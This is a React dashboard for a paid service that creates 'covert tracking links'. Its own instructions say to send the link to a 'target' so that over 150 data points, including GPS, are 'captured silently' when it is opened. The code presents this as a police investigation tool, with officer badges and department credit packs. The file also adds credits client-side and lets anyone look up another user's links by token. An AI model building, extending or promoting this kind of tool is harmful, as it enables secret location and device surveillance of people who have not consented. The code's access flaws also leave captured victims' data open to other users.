import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useAuth } from "../contexts/AuthContext";
import { db } from "../firebase/config";
import { collection, query, where, onSnapshot, limit, getDocs, orderBy } from "firebase/firestore";
import { createTrackingLink } from "../utils/linkService";
import {
  Link2, Zap, Activity,
  ChevronRight, Clock, Smartphone,
  Globe, Eye, CreditCard, X, MapPin,
  List, BarChart2
} from "lucide-react";

function toIST(dateInput) {
  if (!dateInput) return "-";
  const date = dateInput?.toMillis ? new Date(dateInput.toMillis()) : new Date(dateInput);
  return date.toLocaleString("en-IN", {
    timeZone: "Asia/Kolkata",
    day: "2-digit", month: "2-digit", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
  });
}

function toISTShort(dateInput) {
  if (!dateInput) return "-";
  const date = dateInput?.toMillis ? new Date(dateInput.toMillis()) : new Date(dateInput);
  return date.toLocaleString("en-IN", {
    timeZone: "Asia/Kolkata",
    day: "2-digit", month: "short",
    hour: "2-digit", minute: "2-digit",
  });
}

function detectInputType(value) {
  if (!value) return null;
  const trimmed = value.trim();
  if (trimmed.includes(".") || trimmed.startsWith("http")) return "url";
  if (/^[a-zA-Z0-9]+$/.test(trimmed)) return "code";
  return null;
}

export default function Dashboard() {
  const { currentUser, userProfile, fetchUserProfile } = useAuth();
  const [links, setLinks] = useState([]);
  const [label, setLabel] = useState("");
  const [inputValue, setInputValue] = useState("");
  const [generating, setGenerating] = useState(false);
  const [error, setError] = useState("");
  const [showPayment, setShowPayment] = useState(false);
  const navigate = useNavigate();
  const detectedType = detectInputType(inputValue);
  const credits = userProfile?.credits ?? 0;

  useEffect(() => {
    if (!currentUser) return;
    const q = query(collection(db, "trackingLinks"), where("uid", "==", currentUser.uid), orderBy("createdAt", "desc"), limit(20));
    const unsub = onSnapshot(q, (snap) => {
      const data = snap.docs.map((d) => ({ id: d.id, ...d.data() }));
      data.sort((a, b) => (b.createdAt?.toMillis?.() ?? 0) - (a.createdAt?.toMillis?.() ?? 0));
      setLinks(data);
    });
    return unsub;
  }, [currentUser]);


  async function handleGenerate() {
    const type = detectInputType(inputValue);
    if (type !== "url") { setError("Please enter a valid URL"); return; }
    if (credits < 1) { setShowPayment(true); return; }

    const finalUrl = inputValue.startsWith("http") ? inputValue : "https://" + inputValue;
    setGenerating(true);
    setError("");

    try {
      const result = await createTrackingLink(currentUser.uid, label || "Tracking Link", finalUrl);
      navigate("/generate", {
        state: {
          originalUrl: finalUrl,
          trackingUrl: result.trackingUrl,
          shortUrl: result.shortUrl || result.trackingUrl,
          token: result.token,
          createdAt: new Date().toISOString(),
        },
      });
    } catch (err) {
      setError(err.message);
    }
    setGenerating(false);
  }


  function handleSelectLink(link) {
    navigate("/generate", {
      state: {
        originalUrl: link.destinationUrl || link.originalUrl || "",
        trackingUrl: link.trackingUrl,
        shortUrl: link.shortUrl || link.trackingUrl,
        token: link.token,
        createdAt: link.createdAt,
      },
    });
  }

  return (
    <div className="min-h-screen bg-surface pt-16 text-text-primary">
      <div className="max-w-7xl mx-auto px-4 py-8">

        {/* ── Top header ── */}
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8">
          <div>
            <h1 className="font-display text-4xl tracking-wider">COMMAND <span className="text-primary">CENTER</span></h1>
            <p className="font-body text-sm text-text-secondary mt-1">
              Welcome back, <span className="text-primary">{userProfile?.displayName || "Officer"}</span>
              {userProfile?.badgeId && <span className="text-text-muted"> · Badge #{userProfile.badgeId}</span>}
            </p>
          </div>
          <div className="flex items-center gap-3">
            <div className="bg-surface-card border border-surface-border rounded-xl px-5 py-3 flex items-center gap-3">
              <Zap className="w-5 h-5 text-primary" />
              <div>
                <div className="font-mono text-2xl text-primary leading-none">{credits}</div>
                <div className="font-body text-xs text-text-muted">Credits</div>
              </div>
            </div>
            <button onClick={() => setShowPayment(true)} className="px-4 py-3 bg-primary/10 border border-primary/30 text-primary rounded-xl font-body text-sm hover:bg-primary/20 transition-colors flex items-center gap-2">
              <CreditCard className="w-4 h-4" /> Buy Credits
            </button>
          </div>
        </div>

        {/* ── Stats ── */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
          {[
            { label: "Total Links", value: links.length, icon: <Link2 className="w-4 h-4" /> },
            { label: "Total Captures", value: links.reduce((a, l) => a + (l.captureCount || 0), 0), icon: <Eye className="w-4 h-4" /> },
            { label: "Active Links", value: links.filter((l) => l.active).length, icon: <Activity className="w-4 h-4" /> },
            { label: "Total Clicks", value: links.reduce((a, l) => a + (l.clicks || 0), 0), icon: <Globe className="w-4 h-4" /> },
          ].map((stat) => (
            <div key={stat.label} className="bg-surface-card border border-surface-border rounded-xl p-4">
              <div className="flex items-center gap-2 text-text-muted mb-2">
                {stat.icon}
                <span className="font-body text-xs uppercase tracking-wider">{stat.label}</span>
              </div>
              <div className="font-display text-3xl text-text-primary">{stat.value}</div>
            </div>
          ))}
        </div>

        {/* ── URL Generator ── */}
        <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6 mb-8">
          <div className="text-center mb-6">
            <h2 className="font-display text-3xl tracking-wider mb-2">
              CREATE <span className="text-primary">TRACKING URL</span>
            </h2>
            <p className="font-body text-sm text-text-muted">Enter any URL to generate a covert tracking link</p>
          </div>

          <input
            type="text"
            value={inputValue}
            onChange={(e) => { setInputValue(e.target.value); setError(""); }}
            placeholder="Enter URL or Tracking Code..."
            className="w-full bg-surface border border-surface-border rounded-xl px-5 py-4 font-body text-base text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors text-center"
          />

          {inputValue && (
            <p className="text-xs text-text-muted text-center mt-2">
              Detected: <span className="text-primary">
                {detectedType === "url" ? "URL" : detectedType === "code" ? "Tracking Code" : "Unknown"}
              </span>
            </p>
          )}

          {error && <p className="font-body text-sm text-accent text-center mt-2">{error}</p>}

          <div className="flex gap-3 justify-center mt-6">
            <button
              type="button"
              onClick={handleGenerate}
              className="flex items-center gap-2 px-8 py-3 bg-primary text-surface font-body font-bold rounded-xl hover:bg-primary-dark transition-all shadow-glow"
            >
              <Link2 className="w-4 h-4" />
              {generating ? "Creating..." : "Create URL"}
            </button>

            <button
              type="button"
              onClick={async () => {
                setError("");
                const type = detectInputType(inputValue);
                if (type !== "code") { setError("Please enter a valid tracking code"); return; }
                try {
                  const q = query(collection(db, "trackingLinks"), where("token", "==", inputValue.trim()), limit(1));
                  const snap = await getDocs(q);
                  if (snap.empty) { setError("Invalid tracking code"); return; }
                  navigate("/generate", { state: snap.docs[0].data() });
                } catch (err) {
                  setError("Something went wrong");
                }
              }}
              className="flex items-center gap-2 px-8 py-3 border border-surface-border text-text-secondary rounded-xl hover:border-primary hover:text-primary transition-all"
            >
              <Eye className="w-4 h-4" /> Tracking Code
            </button>
          </div>
        </div>

        {/* ════════════════════════════════
            SPLIT: Links List | Detail / How It Works
        ════════════════════════════════ */}
        <div className="flex gap-6 pb-20">

          {/* ── LEFT: All Previous Links ── */}
          <div className="w-1/2 flex flex-col">
            <div className="bg-surface-elevated border border-surface-border rounded-2xl overflow-hidden">

              <div className="border-b border-surface-border px-6 py-4 flex items-center justify-between flex-shrink-0">
                <div className="flex items-center gap-2">
                  <List className="w-4 h-4 text-primary" />
                  <h3 className="font-display text-xl tracking-wider">
                    MY <span className="text-primary">LINKS</span>
                  </h3>
                  {links.length > 0 && (
                    <span className="font-mono text-xs text-text-muted bg-surface border border-surface-border px-2 py-0.5 rounded-full">
                      {links.length}
                    </span>
                  )}
                </div>
                <span className="font-body text-xs text-text-muted italic">Click to inspect</span>
              </div>

              <div className="overflow-y-auto p-4 space-y-2" style={{ maxHeight: 462 }}>
                {links.length === 0 ? (
                  <div className="flex flex-col items-center justify-center py-20 text-center">
                    <BarChart2 className="w-10 h-10 text-text-muted mb-3 opacity-40" />
                    <p className="font-body text-sm text-text-muted">No links yet.</p>
                    <p className="font-body text-xs text-text-muted mt-1">Generate your first tracking link above.</p>
                  </div>
                ) : (
                  links.map((link) => {
                    const captureCount = link.captureCount || 0;
                    const hasGPS = link.hasGPS || false;

                    return (
                      <button
                        key={link.id}
                        onClick={() => handleSelectLink(link)}
                        className="w-full text-left rounded-xl border border-surface-border bg-surface hover:border-primary/30 hover:bg-surface-elevated transition-all duration-200 group"
                      >
                        <div className="px-4 py-3.5">
                          <div className="flex items-start justify-between gap-2 mb-2">
                            <div className="flex-1 min-w-0">
                              <div className="font-mono text-xs text-text-muted truncate mb-0.5">
                                {link.destinationUrl || link.originalUrl || link.label || "-"}
                              </div>
                              <div className="font-mono text-xs text-primary truncate">
                                {link.shortUrl || link.trackingUrl}
                              </div>
                            </div>
                            <ChevronRight className="w-4 h-4 flex-shrink-0 mt-0.5 text-text-muted group-hover:translate-x-0.5 transition-transform" />
                          </div>

                          <div className="flex items-center gap-2 flex-wrap">
                            <div className="flex items-center gap-1 text-text-muted">
                              <Clock className="w-3 h-3" />
                              <span className="font-body text-xs">{toISTShort(link.createdAt)}</span>
                            </div>

                            <div className={`flex items-center gap-1 font-mono text-xs px-1.5 py-0.5 rounded-full border ${captureCount > 0
                              ? "text-green-400 border-green-500/20 bg-green-500/10"
                              : "text-text-muted border-surface-border"
                              }`}>
                              <Eye className="w-3 h-3" />
                              {captureCount} capture{captureCount !== 1 ? "s" : ""}
                            </div>

                            {hasGPS && (
                              <span className="flex items-center gap-1 font-mono text-xs text-yellow-400 border border-yellow-500/20 bg-yellow-500/10 px-1.5 py-0.5 rounded-full">
                                <MapPin className="w-3 h-3" /> GPS
                              </span>
                            )}
                          </div>
                        </div>
                      </button>
                    );
                  })
                )}
              </div>
            </div>
          </div>

          {/* ── RIGHT: How It Works ── */}
          <div className="w-1/2 flex flex-col">
            <div className="bg-surface-elevated border border-surface-border rounded-2xl overflow-hidden">
              <div className="border-b border-surface-border px-8 py-5">
                <h3 className="font-display text-2xl tracking-wider">
                  HOW IT <span className="text-primary">WORKS</span>
                </h3>
              </div>
              <div className="divide-y divide-surface-border">
                {[
                  { icon: <Link2 className="w-5 h-5 text-primary" />, title: "Paste any URL", desc: "Enter any website link — our system wraps it in a tracking link." },
                  { icon: <Globe className="w-5 h-5 text-primary" />, title: "Share the link", desc: "Send the generated URL to your target via WhatsApp, SMS, or email." },
                  { icon: <Smartphone className="w-5 h-5 text-primary" />, title: "They click it", desc: "The moment they open it, 150+ data points are captured silently." },
                  { icon: <Eye className="w-5 h-5 text-primary" />, title: "View captures", desc: "Results appear instantly in real time — no refresh needed." },
                ].map((step, i) => (
                  <div key={i} className="flex items-center gap-6 px-8 py-6 hover:bg-surface transition-colors">
                    <div className="w-12 h-12 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center flex-shrink-0">
                      {step.icon}
                    </div>
                    <div>
                      <div className="font-body text-base font-semibold text-text-primary mb-1">{step.title}</div>
                      <div className="font-body text-sm text-text-muted">{step.desc}</div>
                    </div>
                  </div>
                ))}
              </div>
              <div className="px-8 py-5 border-t border-surface-border">
                <p className="font-body text-xs text-text-muted text-center">
                  ← Click any link to view its full details and captures
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {showPayment && <PaymentModal onClose={() => setShowPayment(false)} uid={currentUser?.uid} fetchUserProfile={fetchUserProfile} />}
    </div>
  );
}

function PaymentModal({ onClose, uid, fetchUserProfile }) {
  const plans = [
    { credits: 5, price: 99, label: "Starter Pack" },
    { credits: 15, price: 249, label: "Investigation Pack", popular: true },
    { credits: 50, price: 699, label: "Department Pack" },
  ];
  const [selected, setSelected] = useState(1);
  const [processing, setProcessing] = useState(false);
  const [done, setDone] = useState(false);

  async function handlePurchase() {
    setProcessing(true);
    await new Promise((r) => setTimeout(r, 500));
    const { addCredits } = await import("../utils/linkService");
    await addCredits(uid, plans[selected].credits);
    await fetchUserProfile(uid);
    setDone(true);
    setProcessing(false);
  }

  return (
    <div className="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex items-center justify-center px-4">
      <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6 w-full max-w-md shadow-card">
        <div className="flex items-center justify-between mb-6">
          <h2 className="font-display text-2xl tracking-wider text-text-primary">BUY <span className="text-primary">CREDITS</span></h2>
          <button onClick={onClose} className="text-text-muted hover:text-text-primary"><X className="w-5 h-5" /></button>
        </div>

        {done ? (
          <div className="text-center py-8">
            <div className="text-5xl mb-4">✅</div>
            <h3 className="font-display text-2xl text-primary mb-2">Credits Added!</h3>
            <p className="font-body text-text-secondary text-sm">{plans[selected].credits} credits added to your account.</p>
            <button onClick={onClose} className="mt-6 px-6 py-3 bg-primary text-surface font-body font-bold rounded-lg">Back to Dashboard</button>
          </div>
        ) : (
          <>
            <div className="space-y-3 mb-6">
              {plans.map((plan, i) => (
                <button key={i} onClick={() => setSelected(i)}
                  className={`w-full text-left p-4 rounded-xl border transition-all ${selected === i ? "border-primary bg-primary/10 shadow-glow" : "border-surface-border bg-surface hover:border-primary/40"}`}>
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="flex items-center gap-2">
                        <span className="font-display text-lg text-text-primary">{plan.label}</span>
                        {plan.popular && <span className="bg-primary text-surface text-xs px-2 py-0.5 rounded-full font-body font-bold">POPULAR</span>}
                      </div>
                      <div className="font-body text-sm text-text-secondary mt-0.5">{plan.credits} tracking links</div>
                    </div>
                    <div className="text-right">
                      <div className="font-display text-2xl text-primary">Rs.{plan.price}</div>
                      <div className="font-body text-xs text-text-muted">Rs.{(plan.price / plan.credits).toFixed(0)}/link</div>
                    </div>
                  </div>
                </button>
              ))}
            </div>
            <div className="bg-surface border border-surface-border rounded-xl p-3 mb-4 text-xs font-body text-text-muted">
              Demo Mode: Integrate Razorpay for real payments in production.
            </div>
            <button onClick={handlePurchase} disabled={processing}
              className="w-full px-6 py-3.5 bg-primary text-surface font-body font-bold rounded-lg hover:bg-primary-dark transition-all shadow-glow disabled:opacity-60 flex items-center justify-center gap-2">
              <CreditCard className="w-4 h-4" />
              {processing ? "Processing..." : "Pay Rs." + plans[selected].price}
            </button>
          </>
        )}
      </div>
    </div>
  );
}